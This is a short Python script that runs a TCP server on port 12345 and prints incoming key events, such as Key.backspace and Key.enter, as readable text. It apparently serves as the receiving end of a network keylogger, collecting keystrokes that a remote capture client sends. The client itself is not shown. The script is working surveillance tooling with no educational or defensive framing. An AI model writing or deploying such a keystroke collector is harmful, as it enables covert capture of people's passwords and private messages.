import socket			 

serverSocket = socket.socket()		 
print ("Socket successfully created")

port = 12345			

serverSocket.bind(('', port))		 
# print ("socket binded to %s" %(port)) 

serverSocket.listen(5)	 
print ("socket is listening in " + str(port))		 

while True: 

    clientSocket, clientAddress = serverSocket.accept()	 
    print ('Got connection from', clientAddress )
    clientSocket.send('Thank you for connecting'.encode()) 
    
    while True: 
        data = clientSocket.recv(1024)
        if not data:
            break
        data = data.decode('utf-8')
        data = data.replace("'b'", "")
        data = data.replace("'", "")
        
        if data == "Key.backspace":
            print('\b' + ' ' + '\b', end="")
        else: 
            if data == "Key.shift":
                data = ""
            if data == "Key.ctrl_l":
                data = ""
            if data == "Key.alt_l":
                data = ""
            if data == "Key.tab":
                data = "\t"
            if data == "Key.enter":
                data = "\n"
            if data == "Key.space":
                data = "_"
            print(data, end="")

    clientSocket.close()

    break
